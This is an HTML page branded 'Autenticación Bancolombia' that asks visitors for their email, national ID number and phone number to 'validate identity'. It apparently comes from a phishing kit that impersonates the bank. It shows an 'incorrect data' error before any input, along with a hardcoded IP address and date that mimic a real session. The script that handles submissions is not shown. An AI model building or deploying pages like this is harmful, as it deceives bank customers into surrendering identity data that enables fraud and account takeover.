<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación Bancolombia</title>
    <link rel="icon" href="../assets/img/logo.png">

    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link href="/assets/css/main.css" rel='stylesheet'>
</head>
<body>
    <div class="wrapper">
        <div class="error">
            <div class="error__icon">
                <i class='bx bx-info-circle'></i>
            </div>

            <div class="error__mgj">
                <div class="error__ttl">Datos incorrectos</div>

                <div class="error__txt">
                    Los datos ingresados no coinciden, inténtalo nuevamente.
                </div>
            </div>
        </div>

        <header class="header">
            <span>Salir <i class='bx bx-exit'></i></span>
        </header>

        <main class="main">
            <h2 class="main__ttl">Ingresa tu información</h2>

            <div class="box">
                <p class="box__txt">
                    A continuación validaremos tus datos para comprobar tu identidad.
                </p>

                <div class="box__element">
                    <i class='bx bx-envelope'></i>
                    <input class="box__input" type="email" required>
                    <span class="box__lbl">Correo</span>
                </div>

                <div class="box__element">
                    <i class='bx bx-id-card'></i>
                    <input class="box__input" type="text" required>
                    <span class="box__lbl">Cedula</span>
                </div>

                <div class="box__element">
                    <i class='bx bx-phone'></i>
                    <input class="box__input" type="text" required>
                    <span class="box__lbl">Telefono</span>
                </div>

                <div class="box__opt">
                    <button class="box__btn box__btn--transp">Volver</button>
                    <button class="box__btn">Continuar</button>
                </div>
            </div>

            <div class="picture"></div>

        </main>
        
        <footer class="footer">
            <div class="line"></div>
            <div class="footer__logo1"></div>
            <div class="footer__logo2"></div>

            <span>
                <p>Dirección IP: 190.210.118.1</p>
                <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
            </span>
        </footer>
    </div>
</body>
</html>

<script src="/assets/js/main.js"></script>
